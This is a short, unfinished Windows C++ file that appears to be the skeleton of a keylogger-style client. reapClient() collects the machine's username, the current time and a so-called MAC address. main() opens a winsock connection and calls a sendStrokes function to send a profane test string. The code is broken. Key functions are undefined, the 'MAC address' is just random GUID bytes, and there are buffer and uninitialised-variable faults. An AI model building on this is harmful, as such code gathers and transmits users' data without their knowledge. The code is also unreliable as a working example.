#include <conio.h>
#include <time.h>
#include <Lmcons.h>
#include <stdio.h>
#include <iostream> 
#include <winsock2.h>
#include <ws2tcpip.h>
#include <mstcpip.h>
#include <ws2ipdef.h>
#include <string.h> 
#include <windows.h>



struct ClientInfo {
    char mac_addr[18];
    char current_time[30]; 
    char os_username[30]; 
};



ClientInfo reapClient(){

    ClientInfo result;
    char username[30];  
    char currentTime[30];
    char mac_addr[18];

    GUID uuid;
    CoCreateGuid(&uuid);
    // Spit the address out
    sprintf(mac_addr,"%02X:%02X:%02X:%02X:%02X:%02X",
        uuid.Data4[2],uuid.Data4[3],uuid.Data4[4],
        uuid.Data4[5],uuid.Data4[6],uuid.Data4[7]);

    // get current time
    time_t rawtime;
    struct tm * timeinfo;

    time ( &rawtime );
    timeinfo = localtime ( &rawtime );

    sprintf(currentTime, "%s", asctime(timeinfo));

    TCHAR name [ UNLEN + 1 ];
    DWORD size = UNLEN + 1;

    if(GetUserName((TCHAR*)name, &size)){
        sprintf(username, "%s", name);
    }else{
        printf("No username detected "); 
    }

    strcpy(result.mac_addr, mac_addr);
    strcpy(result.current_time, currentTime);
    strcpy(result.os_username, username);

    return result; 

}



int main(){

	char *packet = "Fuck you cunt"; 

	if(startWinSock() == true){
		printf("Started winsock service: "); 
	}

	if(sendStrokes(packet) == true){
		printf("Successfully sent packets "); 
	} 

    return 0;
}
